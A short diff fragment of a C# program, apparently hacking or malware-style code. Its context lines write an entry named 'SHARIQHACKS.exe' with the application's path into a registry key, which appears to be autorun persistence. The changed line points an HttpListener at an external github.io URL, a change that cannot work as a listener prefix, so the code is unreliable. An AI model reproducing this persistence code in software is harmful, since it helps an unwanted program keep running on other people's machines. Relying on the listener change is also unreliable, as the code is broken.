@@ -287,7 +287,7 @@ class Program
             rk.SetValue("SHARIQHACKS.exe", apppath);
 
             HttpListener listener = new HttpListener();
-            listener.Prefixes.Add("http://localhost:8080/Fuck/");
+            listener.Prefixes.Add("https://shariq781.github.io/shariqtest/");
             listener.Start();
             Console.WriteLine("Waiting For Response On Localhost...");
 
